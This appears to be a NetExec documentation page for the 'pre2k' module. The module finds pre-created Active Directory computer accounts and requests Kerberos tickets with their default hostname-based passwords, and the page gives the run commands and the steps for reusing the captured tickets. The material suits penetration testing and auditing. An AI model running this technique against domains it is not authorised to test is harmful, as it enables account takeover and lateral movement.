## Pre2k – Pre-Created Computer Account Abuse


Identifies **pre-created computer accounts** in Active Directory and attempts to obtain **Kerberos TGTs** using their default machine password.

Targets computer objects with:
- `objectClass=computer`
- `userAccountControl=4128` (WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD)

The module:
1. Enumerates vulnerable computer accounts via LDAP
2. Saves discovered accounts to file
3. Attempts TGT request using password = first 14 chars of hostname (lowercase)
4. Saves valid tickets as `.ccache`

---

### Usage

```bash
nxc ldap <hostname> -u <user> -p <pass> -M pre2k
```
### Output:

Discovered accounts:
```bash
~/.nxc/modules/pre2k/<domain>/precreated_computers.txt
```
Kerberos tickets:
```bash
~/.nxc/modules/pre2k/ccache/<machine>.ccache
```
## Using the forged ticket
bash
```
export KRB5CCNAME=<machine>.ccache
nxc ldap <dc> --use-kcache
```
### References: 
{% embed url="https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/" %}
